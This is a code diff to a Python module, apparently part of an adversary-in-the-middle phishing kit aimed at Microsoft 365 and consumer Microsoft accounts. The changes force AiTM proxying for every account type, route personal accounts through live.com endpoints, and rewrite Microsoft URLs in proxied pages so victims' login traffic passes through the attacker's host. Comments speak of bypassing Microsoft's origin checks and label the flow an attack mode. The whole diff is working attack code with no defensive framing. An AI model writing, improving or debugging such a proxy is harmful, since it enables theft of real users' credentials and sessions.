@@ -16,6 +16,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
+import re
 
 
 class Office365Module(BaseModule):
@@ -100,18 +101,13 @@ class Office365Module(BaseModule):
         personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
         is_personal = any(domain in self.user.lower() for domain in personal_domains)
 
-        # 2025-07-19 hot-fix:
-        # The consumer (MSA) login experience performs strict origin checks that are
-        # currently breaking our AiTM proxy and yield a blank white screen.  Until a
-        # more robust bypass is implemented, route *personal* accounts through the
-        # (already battle-tested) Selenium automation while keeping AiTM for
-        # organisational tenants.
+        # Keep using AiTM for both account types; investigate white-screen issue via
+        # improved proxy logic rather than switching to Selenium.
 
+        self.attack_mode = "aitm"
         if is_personal:
-            self.attack_mode = "selenium"
-            self.log(f"[Selenium] Personal account detected ({self.user}) – falling back to Selenium automation")
+            self.log(f"[AiTM] Personal account detected ({self.user}) – continuing with AiTM flow (enhanced mapping)")
         else:
-            self.attack_mode = "aitm"
             self.log(f"[AiTM] Organisational account detected ({self.user}) – using AiTM flow")
         
         
@@ -662,10 +658,8 @@ class Office365Module(BaseModule):
                 is_personal = any(domain in self.user.lower() for domain in personal_domains)
                 
                 if is_personal:
-                    # For personal accounts, route to appropriate Microsoft consumer domain
-                    if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
-                        target_url = f"https://login.microsoft.com/{path}"
-                    elif 'account' in path:
+                    # Personal (consumer) accounts always go through live.com endpoints
+                    if 'account' in path:
                         target_url = f"https://account.live.com/{path}"
                     else:
                         target_url = f"https://login.live.com/{path}"
@@ -972,32 +966,18 @@ class Office365Module(BaseModule):
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
-                    # NEW: Rewrite **root-relative** references (e.g. src="/foo.js") so that they
-                    # are also routed through the proxy.  Without this, the browser would request
-                    # the resource from our domain root (resulting in 404) instead of from the
-                    # proxied Microsoft domain, which ultimately causes the page to render with
-                    # missing CSS/JS and eventually a blank screen.
-                    root_relative_attrs = [
-                        'src="/', 'href="/', 'action="/', 'formaction="/',
-                        "src='/", "href='/", "action='/", "formaction='/"
-                    ]
+                    # Broad regex-based rewrite for any direct Microsoft URLs we didn't explicitly list
+                    def _rewrite(match):
+                        url = match.group(0)
+                        # Strip protocol
+                        proto_removed = re.sub(r'^https?:\/\/', '', url)
+                        # Keep only path after domain
+                        path_part = '/'.join(proto_removed.split('/')[1:])
+                        return f"https://{current_host}/proxy/{path_part}"
 
-                    for patt in root_relative_attrs:
-                        # Example:  src="/polyfills.js"  ->  src="https://{host}/proxy/polyfills.js"
-                        if patt in content_str:
-                            replacement_prefix = patt.replace('/','').split('=')[0] + f'="https://{current_host}/proxy/'
-                            content_str = content_str.replace(patt, replacement_prefix)
-
-                    # Also fix CSS inline url("/path") statements
-                    css_url_prefixes = [
-                        'url("/', "url('/"
-                    ]
-
-                    for css_patt in css_url_prefixes:
-                        if css_patt in content_str:
-                            replacement_css = css_patt.replace('/','')[:4] + f'("https://{current_host}/proxy/'
-                            # The preceding slice ensures we keep 'url(' unchanged while replacing opening quote & slash
-                            content_str = content_str.replace(css_patt, replacement_css)
+                    # Match https://<something>.live.com/... or https://<something>.microsoft.com/...
+                    pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
+                    content_str = re.sub(pattern, _rewrite, content_str)
 
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
